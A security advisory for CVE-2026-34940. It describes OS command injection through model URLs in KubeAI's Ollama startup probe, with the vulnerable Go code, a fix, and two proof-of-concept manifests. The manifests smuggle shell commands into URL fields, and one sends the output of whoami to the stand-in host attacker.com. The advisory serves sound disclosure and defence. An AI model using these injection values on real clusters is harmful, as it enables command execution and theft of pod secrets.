# [H] KubeAI: OS Command Injection via Model URL in Ollama Engine startup probe allows arbitrary command execution in model pods

## Summary
Severity: High
Advisory: GHSA-324q-cwx9-7crr
CVE: CVE-2026-34940
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-324q-cwx9-7crr
Type: github-advisory

## Affected
- Go: `github.com/kubeai-project/kubeai` — affected >=0 <0.23.2

## Details
## CHAMP: Description

### Summary

The `ollamaStartupProbeScript()` function in `internal/modelcontroller/engine_ollama.go` constructs a shell command string using `fmt.Sprintf` with unsanitized model URL components (`ref`, `modelParam`). This shell command is executed via `bash -c` as a Kubernetes startup probe. An attacker who can create or update `Model` custom resources can inject arbitrary shell commands that execute inside model server pods.

### Details

The `parseModelURL()` function in `internal/modelcontroller/model_source.go` uses a regex (`^([a-z0-9]+):\/\/([^?]+)(\?.*)?$`) to parse model URLs. The `ref` component (capture group 2) matches `[^?]+`, allowing any characters except `?`, including shell metacharacters like `;`, `|`, `$()`, and backticks.

The `?model=` query parameter (`modelParam`) is also extracted without any sanitization.

**Vulnerable code** ([permalink](https://github.com/kubeai-project/kubeai/blob/ba1824e8c1d70c9092b6c0a48199bba3b8973fee/internal/modelcontroller/engine_ollama.go#L185-L196)):

```go
func ollamaStartupProbeScript(m *kubeaiv1.Model, u modelURL) string {
    startupScript := ""
    if u.scheme == "pvc" {
        startupScript = fmt.Sprintf("/bin/ollama cp %s %s", u.modelParam, m.Name)
    } else {
        if u.pull {
            pullCmd := "/bin/ollama pull"
            if u.insecure {
                pullCmd += " --insecure"
            }
            startupScript = fmt.Sprintf("%s %s && /bin/ollama cp %s %s", pullCmd, u.ref, u.ref, m.Name)
        } else {
            startupScript = fmt.Sprintf("/bin/ollama cp %s %s", u.ref, m.Name)
        }
    }
    // ...
    return startupScript
}
```

This script is then used as a `bash -c` startup probe ([permalink](https://github.com/kubeai-project/kubeai/blob/ba1824e8c1d70c9092b6c0a48199bba3b8973fee/internal/modelcontroller/engine_ollama.go#L108-L112)):

```go
StartupProbe: &corev1.Probe{
    ProbeHandler: corev1.ProbeHandler{
        Exec: &corev1.ExecAction{
            Command: []string{"bash", "-c", startupProbeScript},
        },
    },
},
```

**Compare with the vLLM engine** which safely passes the model ref as a command-line argument (not through a shell):

```go
// engine_vllm.go - safe: args are passed directly, no shell involved
args := []string{
    "--model=" + vllmModelFlag,
    "--served-model-name=" + m.Name,
}
```

**URL parsing** ([permalink](https://github.com/kubeai-project/kubeai/blob/ba1824e8c1d70c9092b6c0a48199bba3b8973fee/internal/modelcontroller/model_source.go#L229-L270)):

```go
var modelURLRegex = regexp.MustCompile(`^([a-z0-9]+):\/\/([^?]+)(\?.*)?$`)

func parseModelURL(urlStr string) (modelURL, error) {
    // ref = matches[2] -> [^?]+ allows shell metacharacters
    // modelParam from ?model= query param -> completely unsanitized
}
```

There is no admission webhook or CRD validation that sanitizes the URL field.

### PoC

**Attack vector 1: Command injection via `ollama://` URL ref**

```yaml
apiVersion: kubeai.org/v1
kind: Model
metadata:
  name: poc-cmd-inject
spec:
  features: ["TextGeneration"]
  engine: OLlama
  url: "ollama://registry.example.com/model;id>/tmp/pwned;echo"
  minReplicas: 1
  maxReplicas: 1
```

The startup probe script becomes:
```bash
/bin/ollama pull registry.example.com/model;id>/tmp/pwned;echo && /bin/ollama cp registry.example.com/model;id>/tmp/pwned;echo poc-cmd-inject && /bin/ollama run poc-cmd-inject hi
```

The injected `id>/tmp/pwned` command executes inside the pod.

**Attack vector 2: Command injection via `?model=` query parameter**

```yaml
apiVersion: kubeai.org/v1
kind: Model
metadata:
  name: poc-cmd-inject-pvc
spec:
  features: ["TextGeneration"]
  engine: OLlama
  url: "pvc://my-pvc?model=qwen2:0.5b;curl${IFS}http://attacker.com/$(whoami);echo"
  minReplicas: 1
  maxReplicas: 1
```

The startup probe script becomes:
```bash
/bin/ollama cp qwen2:0.5b;curl${IFS}http://attacker.com/$(whoami);echo poc-cmd-inject-pvc && /bin/ollama run poc-cmd-inject-pvc hi
```

### Impact

1. **Arbitrary command execution** inside model server pods by any user with Model CRD create/update RBAC
2. In multi-tenant Kubernetes clusters, a tenant with Model creation permissions (but not cluster-admin) can execute arbitrary commands in model pods, potentially accessing secrets, service account tokens, or lateral-moving to other cluster resources
3. Data exfiltration from the model pod's environment (environment variables, mounted secrets, service account tokens)
4. Compromise of the model serving infrastructure

### Suggested Fix

Replace the `bash -c` startup probe with either:
1. An exec probe that passes arguments as separate array elements (like the vLLM engine does), or
2. Validate/sanitize `u.ref` and `u.modelParam` to only allow alphanumeric characters, slashes, colons, dots, and hyphens before interpolating into the shell command

Example fix:
```go
// Option 1: Use separate args instead of bash -c
Command: []string{"/bin/ollama", "pull", u.ref}

// Option 2: Sanitize inputs
var safeModelRef = regexp.MustCompile(`^[a-zA-Z0-9._:/-]+$`)
if !safeModelRef.MatchString(u.ref) {
    return "", fmt.Errorf("invalid model reference: %s", u.ref)
}
```

## References
- https://github.com/kubeai-project/kubeai/security/advisories/GHSA-324q-cwx9-7crr
- https://nvd.nist.gov/vuln/detail/CVE-2026-34940
- https://github.com/kubeai-project/kubeai
